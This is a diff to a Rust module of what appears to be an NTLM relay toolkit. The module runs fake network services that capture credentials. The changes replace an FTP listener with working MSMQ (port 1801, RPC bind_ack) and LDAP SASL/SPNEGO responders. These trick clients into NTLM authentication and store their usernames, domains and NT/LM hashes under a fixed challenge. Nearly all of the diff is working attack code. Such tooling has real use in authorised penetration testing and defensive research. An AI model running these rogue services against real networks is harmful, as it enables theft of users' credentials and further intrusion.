@@ -1,7 +1,7 @@
 //! Responder Module
 //!
 //! Implements credential capture via fake services
-//! (SMB, HTTP, LDAP, FTP, etc.) by listening for NTLM
+//! (SMB, HTTP, LDAP, MSMQ) by listening for NTLM
 //! authentication attempts and extracting credentials.
 
 use crate::{RelayError, Result};
@@ -23,8 +23,11 @@ const NTLM_SIGNATURE: &[u8; 8] = b"NTLMSSP\x00";
 /// NTLM message types
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum NtlmMessageType {
+    /// `` variant
     Negotiate = 1,
+    /// `` variant
     Challenge = 2,
+    /// `` variant
     Authenticate = 3,
 }
 
@@ -51,25 +54,33 @@ fn parse_ntlm_type(data: &[u8]) -> Option<NtlmMessageType> {
 /// Parsed NTLM Negotiate message
 #[derive(Debug, Clone)]
 pub struct NtlmNegotiate {
+    /// flags field
     pub flags: u32,
+    /// Domain FQDN
     pub domain: Option<String>,
+    /// workstation field
     pub workstation: Option<String>,
 }
 
 /// Parsed NTLM Authenticate message  
 #[derive(Debug, Clone)]
 pub struct NtlmAuthenticate {
+    /// LM response data
     pub lm_response: Vec<u8>,
+    /// NT response data
     pub nt_response: Vec<u8>,
+    /// Domain FQDN
     pub domain: String,
+    /// Username for authentication
     pub username: String,
+    /// workstation field
     pub workstation: String,
+    /// Key data
     pub session_key: Option<Vec<u8>>,
 }
 
 /// Parse NTLM Negotiate message
-#[allow(dead_code)] // NTLM parser kept for relay implementation
-fn parse_ntlm_negotiate(data: &[u8]) -> Option<NtlmNegotiate> {
+fn _parse_ntlm_negotiate(data: &[u8]) -> Option<NtlmNegotiate> {
     if data.len() < 16 {
         return None;
     }
@@ -255,8 +266,8 @@ pub struct ResponderConfig {
     pub smb: bool,
     /// Enable LDAP server
     pub ldap: bool,
-    /// Enable FTP server
-    pub ftp: bool,
+    /// Enable MSMQ server (port 1801)
+    pub msmq: bool,
 }
 
 impl Default for ResponderConfig {
@@ -267,7 +278,7 @@ impl Default for ResponderConfig {
             http: true,
             smb: true,
             ldap: false,
-            ftp: false,
+            msmq: false,
         }
     }
 }
@@ -287,7 +298,7 @@ pub struct CapturedCredential {
     pub lm_response: String,
     /// NT response (hex)
     pub nt_response: String,
-    /// Protocol used (HTTP, SMB, LDAP, FTP)
+    /// Protocol used (HTTP, SMB, LDAP, MSMQ)
     pub protocol: String,
     /// Timestamp
     pub timestamp: chrono::DateTime<chrono::Utc>,
@@ -338,12 +349,12 @@ impl Responder {
         }
 
         info!(
-            "Starting responder on {} (HTTP: {}, SMB: {}, LDAP: {}, FTP: {})",
+            "Starting responder on {} (HTTP: {}, SMB: {}, LDAP: {}, MSMQ: {})",
             self.config.listen_ip,
             self.config.http,
             self.config.smb,
             self.config.ldap,
-            self.config.ftp
+            self.config.msmq
         );
 
         self.running.store(true, Ordering::SeqCst);
@@ -362,6 +373,44 @@ impl Responder {
             let handle = thread::spawn(move || {
                 if let Err(e) = Self::run_http_server(running, &listen_ip, &challenge, captured) {
                     error!("HTTP server error: {}", e);
+                }
+            });
+            self.threads.push(handle);
+        }
+
+        // Start MSMQ server
+        if self.config.msmq {
+            let running = Arc::clone(&self.running);
+            let listen_ip = self.config.listen_ip.clone();
+            let challenge = self
+                .config
+                .challenge
+                .clone()
+                .unwrap_or_else(|| "1122334455667788".to_string());
+            let captured = Arc::clone(&self.captured);
+
+            let handle = thread::spawn(move || {
+                if let Err(e) = Self::run_msmq_server(running, &listen_ip, &challenge, captured) {
+                    error!("MSMQ server error: {}", e);
+                }
+            });
+            self.threads.push(handle);
+        }
+
+        // Start LDAP server
+        if self.config.ldap {
+            let running = Arc::clone(&self.running);
+            let listen_ip = self.config.listen_ip.clone();
+            let challenge = self
+                .config
+                .challenge
+                .clone()
+                .unwrap_or_else(|| "1122334455667788".to_string());
+            let captured = Arc::clone(&self.captured);
+
+            let handle = thread::spawn(move || {
+                if let Err(e) = Self::run_ldap_server(running, &listen_ip, &challenge, captured) {
+                    error!("LDAP server error: {}", e);
                 }
             });
             self.threads.push(handle);
@@ -409,7 +458,13 @@ impl Responder {
 
     /// Get captured credentials
     pub fn get_captured_credentials(&self) -> Vec<CapturedCredential> {
-        self.captured.lock().unwrap().clone()
+        self.captured
+            .lock()
+            .unwrap_or_else(|e| {
+                warn!("Mutex poisoned in Responder — recovering data");
+                e.into_inner()
+            })
+            .clone()
     }
 
     /// Check if responder is running
@@ -532,7 +587,13 @@ impl Responder {
                             cred.domain, cred.username
                         );
 
-                        captured.lock().unwrap().push(cred);
+                        captured
+                            .lock()
+                            .unwrap_or_else(|e| {
+                                warn!("Mutex poisoned in Responder — recovering data");
+                                e.into_inner()
+                            })
+                            .push(cred);
                     }
 
                     // Send final response
@@ -665,7 +726,13 @@ impl Responder {
                 cred.domain, cred.username
             );
 
-            captured.lock().unwrap().push(cred);
+            captured
+                .lock()
+                .unwrap_or_else(|e| {
+                    warn!("Mutex poisoned in Responder — recovering data");
+                    e.into_inner()
+                })
+                .push(cred);
         }
         Ok(())
     }
@@ -735,6 +802,356 @@ impl Drop for Responder {
     }
 }
 
+impl Responder {
+    // ═══════════════════════════════════════════════════════
+    // MSMQ Server
+    // ═══════════════════════════════════════════════════════
+
+    fn run_msmq_server(
+        running: Arc<AtomicBool>,
+        listen_ip: &str,
+        challenge: &str,
+        captured: Arc<std::sync::Mutex<Vec<CapturedCredential>>>,
+    ) -> Result<()> {
+        let addr = format!("{}:1801", listen_ip);
+        let listener = TcpListener::bind(&addr)
+            .map_err(|e| RelayError::Socket(format!("Failed to bind MSMQ port 1801: {}", e)))?;
+
+        listener
+            .set_nonblocking(true)
+            .map_err(|e| RelayError::Socket(format!("Failed to set nonblocking: {}", e)))?;
+
+        info!("MSMQ server listening on {}", addr);
+
+        let challenge_bytes =
+            hex_str_to_bytes(challenge).unwrap_or([0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88]);
+
+        while running.load(Ordering::SeqCst) {
+            match listener.accept() {
+                Ok((stream, peer)) => {
+                    debug!("MSMQ connection from {}", peer);
+                    if let Err(e) = Self::handle_msmq_client(
+                        stream,
+                        peer.ip().to_string(),
+                        challenge_bytes,
+                        &captured,
+                    ) {
+                        debug!("MSMQ client handling error: {}", e);
+                    }
+                }
+                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
+                    thread::sleep(Duration::from_millis(100));
+                    continue;
+                }
+                Err(e) => {
+                    warn!("MSMQ accept error: {}", e);
+                }
+            }
+        }
+
+        info!("MSMQ server stopped");
+        Ok(())
+    }
+
+    fn handle_msmq_client(
+        mut stream: TcpStream,
+        client_ip: String,
+        challenge: [u8; 8],
+        captured: &Arc<std::sync::Mutex<Vec<CapturedCredential>>>,
+    ) -> Result<()> {
+        stream.set_read_timeout(Some(Duration::from_secs(10))).ok();
+        stream.set_write_timeout(Some(Duration::from_secs(10))).ok();
+
+        let mut buf = vec![0u8; 65536];
+        let len = stream
+            .read(&mut buf)
+            .map_err(|e| RelayError::Network(format!("MSMQ read error: {}", e)))?;
+
+        if len < 24 || buf[2] != 11 {
+            // Not an RPC bind PDU
+            return Err(RelayError::Protocol("Expected RPC bind PDU".into()).into());
+        }
+
+        // Extract NTLM negotiate from auth trailer
+        let negotiate = extract_msmq_ntlm_token(&buf[..len]);
+        if negotiate.is_none() {
+            debug!("MSMQ: no NTLM token in RPC bind, sending auth challenge response");
+        }
+
+        // Build RPC bind_ack with NTLM challenge
+        let challenge_msg = build_ntlm_challenge(challenge, "MSMQ");
+        let ack_pdu = build_rpc_bind_ack(&challenge_msg, 0);
+
+        stream
+            .write_all(&ack_pdu)
+            .map_err(|e| RelayError::Network(format!("MSMQ bind_ack write: {}", e)))?;
+
+        // Read second message (RPC request with NTLM authenticate)
+        let mut buf2 = vec![0u8; 65536];
+        let len2 = stream
+            .read(&mut buf2)
+            .map_err(|e| RelayError::Network(format!("MSMQ second read: {}", e)))?;
+
+        if len2 > 0
+            && let Some(auth_data) = extract_msmq_ntlm_token(&buf2[..len2])
+            && auth_data.len() >= 12
+            && &auth_data[0..8] == NTLM_SIGNATURE
+            && u32::from_le_bytes([auth_data[8], auth_data[9], auth_data[10], auth_data[11]]) == 3
+        {
+            // Parse NTLM authenticate and capture
+            if let Some(parsed) = parse_ntlm_authenticate(&auth_data) {
+                let cred = CapturedCredential {
+                    client_ip,
+                    username: parsed.username,
+                    domain: parsed.domain,
+                    challenge: bytes_to_hex(&challenge),
+                    lm_response: bytes_to_hex(&parsed.lm_response),
+                    nt_response: bytes_to_hex(&parsed.nt_response),
+                    protocol: "MSMQ".to_string(),
+                    timestamp: chrono::Utc::now(),
+                };
+
+                info!(
+                    "Captured NTLM credentials: {}\\{} via MSMQ",
+                    cred.domain, cred.username
+                );
+
+                captured
+                    .lock()
+                    .unwrap_or_else(|e| {
+                        warn!("Mutex poisoned in Responder — recovering data");
+                        e.into_inner()
+                    })
+                    .push(cred);
+            }
+        }
+
+        Ok(())
+    }
+
+    // ═══════════════════════════════════════════════════════
+    // LDAP Server (NTLM capture via LDAP SASL bind)
+    // ═══════════════════════════════════════════════════════
+
+    fn run_ldap_server(
+        running: Arc<AtomicBool>,
+        listen_ip: &str,
+        challenge: &str,
+        captured: Arc<std::sync::Mutex<Vec<CapturedCredential>>>,
+    ) -> Result<()> {
+        let listener = std::net::TcpListener::bind(format!("{}:389", listen_ip))
+            .map_err(|e| RelayError::Socket(format!("Failed to bind LDAP: {}", e)))?;
+
+        listener.set_nonblocking(true).ok();
+
+        info!("LDAP responder listening on {}:389", listen_ip);
+
+        for stream in listener.incoming() {
+            if !running.load(Ordering::SeqCst) {
+                break;
+            }
+
+            match stream {
+                Ok(mut stream) => {
+                    let peer = stream.peer_addr().ok();
+                    let challenge_arr: [u8; 8] = hex_str_to_bytes(challenge)
+                        .unwrap_or([0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88]);
+                    if let Err(e) = Self::handle_ldap_client(&mut stream, &challenge_arr, &captured)
+                    {
+                        debug!("LDAP client error: {}", e);
+                    }
+                    if let Some(addr) = peer {
+                        info!("LDAP NTLM handshake completed with {}", addr);
+                    }
+                }
+                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
+                    thread::sleep(Duration::from_millis(100));
+                    continue;
+                }
+                Err(e) => {
+                    warn!("LDAP accept error: {}", e);
+                }
+            }
+        }
+
+        info!("LDAP server stopped");
+        Ok(())
+    }
+
+    fn handle_ldap_client(
+        stream: &mut std::net::TcpStream,
+        challenge_arr: &[u8; 8],
+        captured: &Arc<std::sync::Mutex<Vec<CapturedCredential>>>,
+    ) -> Result<()> {
+        stream.set_read_timeout(Some(Duration::from_secs(10))).ok();
+        stream.set_write_timeout(Some(Duration::from_secs(10))).ok();
+
+        let mut buf = vec![0u8; 65536];
+
+        // Read initial LDAP bind request
+        let len = stream
+            .read(&mut buf)
+            .map_err(|e| RelayError::Network(format!("LDAP read error: {}", e)))?;
+
+        if len < 10 {
+            return Err(RelayError::Protocol("LDAP data too short".into()).into());
+        }
+
+        let bind1 = match parse_ldap_sasl_bind(&buf[..len]) {
+            Some(bind) => bind,
+            None => {
+                let resp = build_ldap_bind_error(1, 2); // protocolError
+                stream.write_all(&resp).ok();
+                return Ok(());
+            }
+        };
+
+        let mech = bind1.mechanism.to_ascii_uppercase();
+        if mech != "GSS-SPNEGO" && mech != "SPNEGO" && mech != "NTLM" {
+            let resp = build_ldap_bind_error(bind1.message_id, 7); // authMethodNotSupported
+            stream.write_all(&resp).ok();
+            return Ok(());
+        }
+
+        let ntlm_data = extract_ntlm_from_spnego(&bind1.credentials);
+        let ntlm_type = ntlm_data.as_ref().and_then(|d| parse_ntlm_type(d));
+        debug!("LDAP NTLM message type: {:?}", ntlm_type);
+
+        // Build NTLM challenge and wrap in LDAP BindResponse
+        let challenge = build_ntlm_challenge(*challenge_arr, "LDAP");
+        let resp = build_ldap_bind_response(&challenge, bind1.message_id);
+        stream
+            .write_all(&resp)
+            .map_err(|e| RelayError::Network(format!("LDAP write: {}", e)))?;
+
+        // Read second bind request (NTLM authenticate)
+        let len2 = stream
+            .read(&mut buf)
+            .map_err(|e| RelayError::Network(format!("LDAP read: {}", e)))?;
+
+        let bind2 = parse_ldap_sasl_bind(&buf[..len2]);
+        if let Some(bind2) = bind2 {
+            if let Some(auth) = extract_ntlm_from_spnego(&bind2.credentials)
+                && let Some(ntlm_auth) = parse_ntlm_authenticate(&auth)
+            {
+                let cred = CapturedCredential {
+                    client_ip: stream
+                        .peer_addr()
+                        .map(|a| a.to_string())
+                        .unwrap_or_default(),
+                    username: ntlm_auth.username,
+                    domain: ntlm_auth.domain,
+                    challenge: bytes_to_hex(challenge_arr),
+                    lm_response: bytes_to_hex(&ntlm_auth.lm_response),
+                    nt_response: bytes_to_hex(&ntlm_auth.nt_response),
+                    protocol: "LDAP".to_string(),
+                    timestamp: chrono::Utc::now(),
+                };
+                let mut cap = captured.lock().unwrap_or_else(|e| {
+                    warn!("Mutex poisoned in Responder — recovering data");
+                    e.into_inner()
+                });
+                cap.push(cred);
+                info!("LDAP responder captured NTLM credentials");
+            }
+
+            let success = build_ldap_bind_success(bind2.message_id);
+            stream.write_all(&success).ok();
+            return Ok(());
+        }
+
+        let success = build_ldap_bind_success(bind1.message_id);
+        stream.write_all(&success).ok();
+
+        Ok(())
+    }
+}
+
+/// Extract NTLM token from an RPC PDU auth trailer.
+/// Validates RPC version (5) and basic PDU structure.
+fn extract_msmq_ntlm_token(data: &[u8]) -> Option<Vec<u8>> {
+    if data.len() < 24 {
+        return None;
+    }
+
+    // Validate RPC version
+    if data[0] != 5 {
+        return None;
+    }
+
+    let frag_len = u16::from_le_bytes([data[8], data[9]]) as usize;
+    let auth_len = u16::from_le_bytes([data[10], data[11]]) as usize;
+
+    if auth_len == 0 || frag_len == 0 || data.len() < 24 + auth_len {
+        return None;
+    }
+
+    // Validate frag_len consistency
+    if frag_len > data.len() {
+        return None;
+    }
+
+    let trailer_start = data.len() - auth_len;
+    if trailer_start + 16 > data.len() {
+        return None;
+    }
+
+    let token_len = u32::from_le_bytes([
+        data[trailer_start + 12],
+        data[trailer_start + 13],
+        data[trailer_start + 14],
+        data[trailer_start + 15],
+    ]) as usize;
+
+    if trailer_start + 16 + token_len <= data.len() && token_len > 0 {
+        Some(data[trailer_start + 16..trailer_start + 16 + token_len].to_vec())
+    } else {
+        None
+    }
+}
+
+/// Build a minimal RPC bind_ack PDU with NTLM challenge as auth trailer
+fn build_rpc_bind_ack(ntlm_challenge: &[u8], assoc_group: u32) -> Vec<u8> {
+    let auth_len = 16 + ntlm_challenge.len();
+    let body_len = 28 + 24 + 16 + ntlm_challenge.len();
+    let frag_len = 24 + body_len;
+
+    let mut pdu = vec![5u8, 0, 12, 0x03]; // RPC v5.0, BIND_ACK
+    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // NDR
+
+    pdu.extend_from_slice(&(frag_len as u16).to_le_bytes());
+    pdu.extend_from_slice(&(auth_len as u16).to_le_bytes());
+    pdu.extend_from_slice(&0u32.to_le_bytes()); // call_id
+
+    // Body
+    pdu.extend_from_slice(&4280u16.to_le_bytes()); // max_xmit
+    pdu.extend_from_slice(&4280u16.to_le_bytes()); // max_recv
+    pdu.extend_from_slice(&assoc_group.to_le_bytes());
+    pdu.push(1); // secondary_addr_len
+    pdu.push(0); // padding
+    pdu.extend_from_slice(&[0u8; 20]); // secondary_addr (empty) + 2 padding
+    pdu.push(1); // num_results
+    pdu.extend_from_slice(&[0x00, 0x00, 0x00]); // padding
+    pdu.extend_from_slice(&0u16.to_le_bytes()); // result
+    pdu.extend_from_slice(&0u16.to_le_bytes()); // reason
+    pdu.extend_from_slice(&[0u8; 16]); // transfer_syntax
+
+    // Auth trailer
+    pdu.extend_from_slice(&10u16.to_le_bytes()); // auth_type: NTLMSSP
+    pdu.extend_from_slice(&6u16.to_le_bytes()); // auth_level: PKT_PRIVACY
+    pdu.push(0); // auth_pad
+    pdu.push(0); // auth_reserved
+    pdu.extend_from_slice(&0u32.to_le_bytes()); // ctx_id
+    pdu.extend_from_slice(&(ntlm_challenge.len() as u32).to_le_bytes());
+    pdu.extend_from_slice(ntlm_challenge);
+
+    while !pdu.len().is_multiple_of(4) {
+        pdu.push(0);
+    }
+
+    pdu
+}
+
 // ═══════════════════════════════════════════════════════════
 // Helper Functions
 // ═══════════════════════════════════════════════════════════
@@ -756,6 +1173,309 @@ fn hex_str_to_bytes(s: &str) -> Option<[u8; 8]> {
 /// Convert bytes to hex string
 fn bytes_to_hex(data: &[u8]) -> String {
     data.iter().map(|b| format!("{:02X}", b)).collect()
+}
+
+// ═══════════════════════════════════════════════════════════
+// LDAP BER helpers for NTLM SASL bind responder
+// ═══════════════════════════════════════════════════════════
+
+#[derive(Debug, Clone)]
+struct LdapSaslBind {
+    message_id: u32,
+    mechanism: String,
+    credentials: Vec<u8>,
+}
+
+/// Build an LDAP BindResponse containing an NTLM challenge as serverSaslCreds.
+/// Also known as LDAP SASL "challenge" response (resultCode 14, saslBindInProgress).
+fn build_ldap_bind_response(ntlm_challenge: &[u8], message_id: u32) -> Vec<u8> {
+    // Wrap NTLM challenge in SPNEGO NegTokenResp
+    // [APPLICATION 1] SEQUENCE { [0] OID, [2] OCTET STRING wrapping NegTokenResp }
+    // Simplified: directly embed as serverSaslCreds OCTET STRING
+    let spnego_resp = build_spnego_challenge(ntlm_challenge);
+
+    // LDAPMessage ::= SEQUENCE {
+    //   messageID      INTEGER (0..maxInt),
+    //   protocolOp     CHOICE { bindResponse BindResponse, ... }
+    // }
+    //
+    // BindResponse ::= [APPLICATION 1] SEQUENCE {
+    //   resultCode      ENUMERATED,
+    //   matchedDN       OCTET STRING,
+    //   diagnosticMsg   OCTET STRING,
+    //   serverSaslCreds OCTET STRING OPTIONAL
+    // }
+
+    // Manually build DER for BindResponse with saslBindInProgress (14)
+    let mut body = vec![
+        0x0A, 0x01, 14, // resultCode = 14 (saslBindInProgress)
+        0x04, 0x00, // matchedDN = "" (OCTET STRING, empty)
+        0x04, 0x00, // diagnosticMsg = "" (OCTET STRING, empty)
+        0x87, // serverSaslCreds (OCTET STRING, context-specific tag [7])
+    ];
+    encode_length(&mut body, spnego_resp.len());
+    body.extend_from_slice(&spnego_resp);
+
+    // Wrap in [APPLICATION 1] tag
+    let mut bind_response = Vec::new();
+    bind_response.push(0x61); // APPLICATION 1
+    encode_length(&mut bind_response, body.len());
+    bind_response.extend_from_slice(&body);
+
+    // Wrap in LDAPMessage SEQUENCE
+    // LDAPMessage ::= SEQUENCE { messageID INTEGER, protocolOp CHOICE }
+    let mut msg = Vec::new();
+    let msg_body = [encode_integer_vec(message_id), bind_response].concat();
+    msg.push(0x30); // SEQUENCE
+    encode_length(&mut msg, msg_body.len());
+    msg.extend_from_slice(&msg_body);
+
+    msg
+}
+
+/// Build an LDAP BindResponse with resultCode 0 (success)
+fn build_ldap_bind_success(message_id: u32) -> Vec<u8> {
+    let body = vec![
+        0x0A, 0x01, 0x00, // resultCode = 0 (success)
+        0x04, 0x00, // matchedDN = ""
+        0x04, 0x00, // diagnosticMsg = ""
+    ];
+
+    // Wrap in [APPLICATION 1]
+    let mut bind_response = Vec::new();
+    bind_response.push(0x61);
+    encode_length(&mut bind_response, body.len());
+    bind_response.extend_from_slice(&body);
+
+    // Wrap in LDAPMessage SEQUENCE
+    let content = [encode_integer_vec(message_id), bind_response].concat();
+    let mut msg = Vec::new();
+    msg.push(0x30);
+    encode_length(&mut msg, content.len());
+    msg.extend_from_slice(&content);
+
+    msg
+}
+
+/// Build an LDAP BindResponse with a specific result code (error).
+fn build_ldap_bind_error(message_id: u32, result_code: u8) -> Vec<u8> {
+    let body = vec![
+        0x0A,
+        0x01,
+        result_code,
+        0x04,
+        0x00, // matchedDN = ""
+        0x04,
+        0x00, // diagnosticMsg = ""
+    ];
+
+    let mut bind_response = Vec::new();
+    bind_response.push(0x61); // APPLICATION 1
+    encode_length(&mut bind_response, body.len());
+    bind_response.extend_from_slice(&body);
+
+    let content = [encode_integer_vec(message_id), bind_response].concat();
+    let mut msg = Vec::new();
+    msg.push(0x30);
+    encode_length(&mut msg, content.len());
+    msg.extend_from_slice(&content);
+
+    msg
+}
+
+/// Build a minimal SPNEGO NegTokenResp wrapping an NTLM challenge
+fn build_spnego_challenge(ntlm_challenge: &[u8]) -> Vec<u8> {
+    // SPNEGO NegTokenResp ::= [1] SEQUENCE {
+    //   negState      [0] ENUMERATED (accept-incomplete),
+    //   supportedMech [1] OID,
+    //   responseToken [2] OCTET STRING (NTLM challenge)
+    // }
+    let mut seq = Vec::new();
+
+    // negState = accept-incomplete (1)
+    let neg_state = [0x0A, 0x01, 0x01];
+    seq.push(0xA0);
+    encode_length(&mut seq, neg_state.len());
+    seq.extend_from_slice(&neg_state);
+
+    // supportedMech [1] — NTLMSSP OID: 1.3.6.1.4.1.311.2.2.10
+    let ntlm_oid = [
+        0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0A,
+    ];
+    seq.push(0xA1);
+    encode_length(&mut seq, ntlm_oid.len());
+    seq.extend_from_slice(&ntlm_oid);
+
+    // responseToken [2] — OCTET STRING of NTLM challenge
+    let mut resp = Vec::new();
+    resp.push(0x04);
+    encode_length(&mut resp, ntlm_challenge.len());
+    resp.extend_from_slice(ntlm_challenge);
+    seq.push(0xA2);
+    encode_length(&mut seq, resp.len());
+    seq.extend_from_slice(&resp);
+
+    let mut seq_wrap = Vec::new();
+    seq_wrap.push(0x30);
+    encode_length(&mut seq_wrap, seq.len());
+    seq_wrap.extend_from_slice(&seq);
+
+    let mut neg_token = Vec::new();
+    neg_token.push(0xA1); // [1] NegTokenResp
+    encode_length(&mut neg_token, seq_wrap.len());
+    neg_token.extend_from_slice(&seq_wrap);
+
+    neg_token
+}
+
+/// Extract NTLMSSP blob from an LDAP SASL bind request
+fn parse_ldap_sasl_bind(data: &[u8]) -> Option<LdapSaslBind> {
+    let mut off = 0usize;
+    let (tag, seq_data) = ber_read_tlv(data, &mut off)?;
+    if tag != 0x30 {
+        return None;
+    }
+
+    let mut inner = 0usize;
+    let (msg_tag, msg_data) = ber_read_tlv(&seq_data, &mut inner)?;
+    if msg_tag != 0x02 {
+        return None;
+    }
+    let message_id = decode_ber_u32(&msg_data)?;
+
+    let (op_tag, op_data) = ber_read_tlv(&seq_data, &mut inner)?;
+    if op_tag != 0x60 {
+        return None;
+    }
+
+    let mut bind_off = 0usize;
+    let _ = ber_read_tlv(&op_data, &mut bind_off)?; // version
+    let _ = ber_read_tlv(&op_data, &mut bind_off)?; // name
+    let (auth_tag, auth_data) = ber_read_tlv(&op_data, &mut bind_off)?;
+    if auth_tag != 0xA3 {
+        return None;
+    }
+
+    let mut auth_off = 0usize;
+    let (mech_tag, mech_data) = ber_read_tlv(&auth_data, &mut auth_off)?;
+    if mech_tag != 0x04 {
+        return None;
+    }
+    let mechanism = String::from_utf8_lossy(&mech_data).to_string();
+    let mut credentials = Vec::new();
+    if let Some((cred_tag, cred_data)) = ber_read_tlv(&auth_data, &mut auth_off)
+        && cred_tag == 0x04
+    {
+        credentials = cred_data;
+    }
+
+    Some(LdapSaslBind {
+        message_id,
+        mechanism,
+        credentials,
+    })
+}
+
+fn extract_ntlm_from_spnego(data: &[u8]) -> Option<Vec<u8>> {
+    if data.len() >= 8 && &data[0..8] == NTLM_SIGNATURE {
+        return Some(data.to_vec());
+    }
+    let sig = b"NTLMSSP";
+    data.windows(sig.len())
+        .position(|w| w == sig)
+        .map(|pos| data[pos..].to_vec())
+}
+
+/// DER length encoding
+fn encode_length(buf: &mut Vec<u8>, len: usize) {
+    if len < 128 {
+        buf.push(len as u8);
+    } else if len < 256 {
+        buf.push(0x81);
+        buf.push(len as u8);
+    } else if len < 65536 {
+        buf.push(0x82);
+        buf.extend_from_slice(&(len as u16).to_be_bytes());
+    } else {
+        buf.push(0x84);
+        buf.extend_from_slice(&(len as u32).to_be_bytes());
+    }
+}
+
+fn decode_ber_u32(data: &[u8]) -> Option<u32> {
+    if data.is_empty() || data.len() > 4 {
+        return None;
+    }
+    if data[0] & 0x80 != 0 {
+        return None;
+    }
+    let mut val = 0u32;
+    for b in data {
+        val = (val << 8) | (*b as u32);
+    }
+    Some(val)
+}
+
+/// BER TLV reader: returns (tag, value) and advances `offset`.
+fn ber_read_tlv(data: &[u8], offset: &mut usize) -> Option<(u8, Vec<u8>)> {
+    if *offset >= data.len() {
+        return None;
+    }
+    let tag = data[*offset];
+    *offset += 1;
+
+    if *offset >= data.len() {
+        return None;
+    }
+    let first_len = data[*offset];
+    *offset += 1;
+
+    let length = if first_len < 0x80 {
+        first_len as usize
+    } else {
+        let extra = (first_len & 0x7F) as usize;
+        if extra == 0 || extra > 4 || *offset + extra > data.len() {
+            return None;
+        }
+        let mut l = 0usize;
+        for i in 0..extra {
+            l = (l << 8) | (data[*offset + i] as usize);
+        }
+        *offset += extra;
+        l
+    };
+
+    if *offset + length > data.len() {
+        return None;
+    }
+    let value = data[*offset..*offset + length].to_vec();
+    *offset += length;
+    Some((tag, value))
+}
+
+/// Encode an integer for DER and return the bytes
+fn encode_integer(buf: &mut Vec<u8>, val: u32) -> usize {
+    let start = buf.len();
+    if val < 256 {
+        buf.push(0x02);
+        buf.push(0x01);
+        buf.push(val as u8);
+    } else {
+        let bytes = val.to_be_bytes();
+        // Skip leading zeros
+        let start_idx = bytes.iter().position(|&b| b != 0).unwrap_or(3);
+        let trimmed = &bytes[start_idx..];
+        buf.push(0x02);
+        buf.push(trimmed.len() as u8);
+        buf.extend_from_slice(trimmed);
+    }
+    buf.len() - start
+}
+
+fn encode_integer_vec(val: u32) -> Vec<u8> {
+    let mut buf = Vec::new();
+    encode_integer(&mut buf, val);
+    buf
 }
 
 #[cfg(test)]
